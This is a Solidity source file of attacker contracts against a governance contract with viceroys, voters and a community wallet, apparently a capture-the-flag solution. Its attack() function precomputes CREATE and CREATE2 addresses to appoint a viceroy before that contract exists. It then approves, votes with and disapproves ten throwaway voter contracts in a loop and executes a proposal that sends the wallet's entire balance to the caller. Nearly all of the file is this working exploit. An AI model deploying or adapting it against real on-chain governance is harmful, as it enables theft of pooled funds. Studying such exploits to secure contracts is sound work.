// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "hardhat/console.sol";

interface IGovernance {
    function appointViceroy(address viceroy, uint256 id) external;

    function deposeViceroy(address viceroy, uint256 id) external;

    function approveVoter(address voter) external;

    function disapproveVoter(address voter) external;

    function createProposal(address viceroy, bytes calldata proposal) external;

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external;

    function executeProposal(uint256 proposal) external;

    function communityWallet() external returns (address);
}

interface ICommunityWallet {
    function exec(address target, bytes calldata data, uint256 value) external;
}

abstract contract AbstractGovernanceAttacker {
    uint256 constant tokenId = 1;
    IGovernance governance;

    function getViceroyAddress() public virtual returns (address);

    function createViceroy(address expectedAddress) public virtual returns (Viceroy);

    function getVoterAddress() public virtual returns (address);

    function createVoter(address expectedAddress) public virtual returns (Voter);

    function attack(IGovernance _governance) public {
        governance = _governance;
        address wallet = governance.communityWallet();
        uint256 amount = wallet.balance;

        bytes memory proposal = abi.encodeCall(ICommunityWallet.exec, (msg.sender, "", amount));
        uint256 proposalId = uint256(keccak256(proposal));

        address viceroyAddress = getViceroyAddress();
        governance.appointViceroy(viceroyAddress, tokenId);

        Viceroy viceroy = createViceroy(viceroyAddress);
        viceroy.createProposal(viceroyAddress, proposal);

        for (uint256 i; i < 10; ) {
            address voterAddress = getVoterAddress();
            viceroy.approveVoter(voterAddress);
            Voter voter = createVoter(voterAddress);
            voter.voteOnProposal(proposalId, true, viceroyAddress);
            viceroy.disapproveVoter(voterAddress);
            unchecked {
                ++i;
            }
        }

        governance.executeProposal(proposalId);
    }
}

contract GovernanceAttackerWithCREATE2 is AbstractGovernanceAttacker {
    uint256 private nonce;
    mapping(address => bytes32) salts;

    function getViceroyAddress() public override returns (address) {
        bytes memory viceroyBytecode = abi.encodePacked(type(Viceroy).creationCode, abi.encode(governance));
        bytes32 viceroySalt = keccak256(abi.encode("viceroy", ++nonce));
        address viceroyAddress = computeAddress(address(this), viceroySalt, viceroyBytecode);
        salts[viceroyAddress] = viceroySalt;
        return viceroyAddress;
    }

    function createViceroy(address expectedAddress) public override returns (Viceroy) {
        // This is an old way of using CREATE2
        // address deployedViceroy = deploy(viceroyBytecode, uint256(viceroySalt));
        // require(viceroyAddress == deployedViceroy, "addresses mismatched");
        // Viceroy viceroy = Viceroy(deployedViceroy);

        Viceroy viceroy = new Viceroy{salt: salts[expectedAddress]}(governance);
        require(address(viceroy) == expectedAddress, "addresses mismatched");
        return viceroy;
    }

    function getVoterAddress() public virtual override returns (address) {
        bytes memory voterBytecode = abi.encodePacked(type(Voter).creationCode, abi.encode(governance));
        bytes32 voterSalt = keccak256(abi.encode("voter", ++nonce));
        address voterAddress = computeAddress(address(this), voterSalt, voterBytecode);
        salts[voterAddress] = voterSalt;
        return voterAddress;
    }

    function createVoter(address expectedAddress) public virtual override returns (Voter) {
        Voter voter = new Voter{salt: salts[expectedAddress]}(governance);
        require(address(voter) == expectedAddress, "addresses mismatched");
        return voter;
    }

    function computeAddress(address deployer, bytes32 salt, bytes memory bytecode) public pure returns (address) {
        bytes32 bytecodeHash = keccak256(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), deployer, salt, bytecodeHash));
        return address(uint160(uint256(hash)));
    }

    function deploy(bytes memory bytecode, uint256 salt) public returns (address) {
        address addr;
        assembly {
            addr := create2(callvalue(), add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "Deploy failed");
        return addr;
    }
}

contract GovernanceAttackerWithCREATE is AbstractGovernanceAttacker {
    uint256 private nonce;

    function getViceroyAddress() public virtual override returns (address) {
        return computeAddress(address(this), ++nonce);
    }

    function createViceroy(address expectedAddress) public virtual override returns (Viceroy) {
        Viceroy viceroy = new Viceroy(governance);
        require(address(viceroy) == expectedAddress, "addresses mismatched");
        return viceroy;
    }

    function getVoterAddress() public virtual override returns (address) {
        return computeAddress(address(this), ++nonce);
    }

    function createVoter(address expectedAddress) public virtual override returns (Voter) {
        Voter voter = new Voter(governance);
        require(address(voter) == expectedAddress, "addresses mismatched");
        return voter;
    }

    function computeAddress(address sender, uint256 _nonce) public pure returns (address) {
        bytes memory data;
        if (_nonce == 0x00) data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x80));
        else if (_nonce <= 0x7f) data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(uint8(_nonce)));
        else if (_nonce <= 0xff)
            data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), sender, bytes1(0x81), bytes1(uint8(_nonce)));
        else if (_nonce <= 0xffff)
            data = abi.encodePacked(
                bytes1(0xd8),
                bytes1(0x94),
                sender,
                bytes1(0x82),
                bytes1(uint8(_nonce >> 8)),
                bytes1(uint8(_nonce))
            );
        else if (_nonce <= 0xffffff)
            data = abi.encodePacked(
                bytes1(0xd9),
                bytes1(0x94),
                sender,
                bytes1(0x83),
                bytes1(uint8(_nonce >> 16)),
                bytes1(uint8(_nonce >> 8)),
                bytes1(uint8(_nonce))
            );
        else
            data = abi.encodePacked(
                bytes1(0xda),
                bytes1(0x94),
                sender,
                bytes1(0x84),
                bytes1(uint8(_nonce >> 24)),
                bytes1(uint8(_nonce >> 16)),
                bytes1(uint8(_nonce >> 8)),
                bytes1(uint8(_nonce))
            );
        return address(uint160(uint256(keccak256(data))));
    }
}

contract GovernanceAttacker is GovernanceAttackerWithCREATE2 {}

contract Voter {
    IGovernance governance;

    constructor(IGovernance _governance) {
        governance = _governance;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        governance.voteOnProposal(proposal, inFavor, viceroy);
    }
}

contract Viceroy {
    IGovernance governance;

    constructor(IGovernance _governance) {
        governance = _governance;
    }

    function approveVoter(address voter) external {
        governance.approveVoter(voter);
    }

    function disapproveVoter(address voter) external {
        governance.disapproveVoter(voter);
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        governance.createProposal(viceroy, proposal);
    }
}
